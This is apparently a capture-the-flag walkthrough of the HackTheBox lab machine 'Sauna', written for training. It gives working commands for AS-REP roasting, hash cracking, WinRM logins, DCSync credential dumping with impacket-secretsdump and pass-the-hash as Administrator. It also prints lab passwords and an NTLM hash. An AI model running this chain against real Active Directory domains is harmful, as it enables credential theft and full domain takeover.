---
description: Explicit Privilege Escalation path via BloodHound and DSync
---

# Sauna

## Summary

* Appending the domain name `EGOTISTICAL-BANK.LOCAL` to `/etc/hosts` revealed usernames on the homepage.
* Used [`username-anarchy`](https://github.com/urbanadventurer/username-anarchy) to generate common permutations.
* Performed an AS-REP Roasting attack using Impacket’s `GetNPUsers.py`, dumped a hash for `fsmith`.
* Cracked the hash with `john`, logged in via WinRM using Evil-WinRM.
* Found plaintext credentials for `svc_loanmgr` via `winPEAS.exe`.
* Discovered via `bloodhound-python` that `svc_loanmgr` had DCSync rights.
* Performed DCSync using `secretsdump.py` to dump Administrator NTLM hash.
* Used Evil-WinRM to get full shell as Administrator.

***

## Enumeration

```bash
sudo nmap -sV -p- 10.10.10.175 -oA saunaNmap -T 5
```

* Key Ports:
  * 80 (HTTP)
  * 88 (Kerberos)
  * 389 (LDAP)
  * 445 (SMB)
  * 5985 (WinRM)
*   Website on port 80 revealed employee names like:

    ```
    Jenny Joy, Johnson, Watson, Fergus Smith, Shaun Coins, Sophie Driver, ...
    ```
* Domain found: `EGOTISTICAL-BANK.LOCAL`
*   `/etc/hosts` entry added:

    ```
    10.10.10.175 EGOTISTICAL-BANK.LOCAL
    ```
* Ran Gobuster — didn’t reveal anything useful.

***

#### Initial Foothold

1.  Generated username permutations:

    ```bash
    ./username-anarchy --input-file user.txt --select-format first.last,first,last,flast
    ```
2.  Ran AS-REP Roasting:

    ```bash
    impacket-GetNPUsers -dc-ip 10.10.10.175 -no-pass -usersfile usernames.txt EGOTISTICAL-BANK.LOCAL/
    ```
3.  Cracked hash with `john`:

    ```bash
    john --wordlist=/usr/share/wordlists/rockyou.txt hash.asrep
    ```

    * Found: `fsmith:Thestrokes23`
4.  Verified with WinRM and gained shell:

    ```bash
    evil-winrm -i 10.10.10.175 -u fsmith -p 'Thestrokes23'
    ```
5.  Looked for interesting files:

    ```powershell
    Get-ChildItem -Path C:\Users\ -Include *.txt,*.log -File -Recurse -ErrorAction SilentlyContinue
    ```

***

## Privilege Escalation

1.  Ran `winPEAS.exe`, found plaintext creds:

    ```none
    DefaultUserName: EGOTISTICALBANK\svc_loanmgr
    DefaultPassword: Moneymakestheworldgoround!
    ```
2.  Used `bloodhound-python`:

    ```bash
    bloodhound-python -u svc_loanmgr -p 'Moneymakestheworldgoround!' -d EGOTISTICAL-BANK.LOCAL -ns 10.10.10.175 -c All
    ```

    * `svc_loanmgr` had **DCSync rights**.
3.  Ran DCSync using secretsdump:

    ```bash
    impacket-secretsdump 'EGOTISTICAL-BANK.LOCAL/svc_loanmgr:Moneymakestheworldgoround!'@10.10.10.175 -just-dc-user Administrator
    ```
4.  Got NTLM hash:

    ```
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
    ```
5.  Verified and gained shell:

    ```bash
    evil-winrm -i 10.10.10.175 -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e
    ```
